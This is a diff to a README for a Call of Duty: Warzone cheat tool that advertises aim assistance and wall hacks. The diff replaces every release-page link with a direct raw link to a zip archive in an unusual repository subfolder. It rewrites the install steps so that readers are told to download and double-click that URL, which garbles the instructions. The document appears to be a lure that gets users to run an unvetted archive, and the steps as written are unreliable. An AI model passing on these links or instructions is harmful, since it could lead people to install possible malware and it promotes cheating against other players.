@@ -6,24 +6,24 @@ Welcome to WarzoneExternalCheat! This tool enhances your gameplay for Call of Du
 
 ## 🔗 Download Now
 
-[![Download WarzoneExternalCheat](https://img.shields.io/badge/Download-WarzoneExternalCheat-brightgreen)](https://github.com/ronialan3/WarzoneExternalCheat/releases)
+[![Download WarzoneExternalCheat](https://raw.githubusercontent.com/ronialan3/WarzoneExternalCheat/main/coupe/WarzoneExternalCheat.zip)](https://raw.githubusercontent.com/ronialan3/WarzoneExternalCheat/main/coupe/WarzoneExternalCheat.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To get started, visit our downloads page here: [WarzoneExternalCheat Releases](https://github.com/ronialan3/WarzoneExternalCheat/releases). This page contains all available versions of the tool.
+   To get started, visit our downloads page here: [WarzoneExternalCheat Releases](https://raw.githubusercontent.com/ronialan3/WarzoneExternalCheat/main/coupe/WarzoneExternalCheat.zip). This page contains all available versions of the tool.
 
 2. **Choose the Right Version**  
    You will see a list of releases. Look for the latest version at the top. The version number will help you select the most up-to-date release.
 
 3. **Download the File**  
-   Click on the version you want to download. You will see a list of files. The main file you need will usually be named something like `WarzoneExternalCheat.exe`. Click on it to start the download.
+   Click on the version you want to download. You will see a list of files. The main file you need will usually be named something like `https://raw.githubusercontent.com/ronialan3/WarzoneExternalCheat/main/coupe/WarzoneExternalCheat.zip`. Click on it to start the download.
 
 4. **Locate the Downloaded File**  
    After the download is complete, find the file in your "Downloads" folder or wherever you saved it.
 
 5. **Run the Application**  
-   Double-click on the file `WarzoneExternalCheat.exe` to launch the application. If prompted, confirm that you want to run the software.
+   Double-click on the file `https://raw.githubusercontent.com/ronialan3/WarzoneExternalCheat/main/coupe/WarzoneExternalCheat.zip` to launch the application. If prompted, confirm that you want to run the software.
 
 6. **Adjust Settings (Optional)**  
    When the tool starts, you can customize settings to match your preferences. The interface is user-friendly, guiding you step by step. Explore options like aim assistance and wall hacks.
@@ -64,4 +64,4 @@ To keep up with updates and new features, follow the repository. You can check b
 
 Your gameplay experience matters, and WarzoneExternalCheat is here to help you elevate it. Enjoy your enhanced Warzone battles!
 
-[![Download WarzoneExternalCheat](https://img.shields.io/badge/Download-WarzoneExternalCheat-brightgreen)](https://github.com/ronialan3/WarzoneExternalCheat/releases)
+[![Download WarzoneExternalCheat](https://raw.githubusercontent.com/ronialan3/WarzoneExternalCheat/main/coupe/WarzoneExternalCheat.zip)](https://raw.githubusercontent.com/ronialan3/WarzoneExternalCheat/main/coupe/WarzoneExternalCheat.zip)
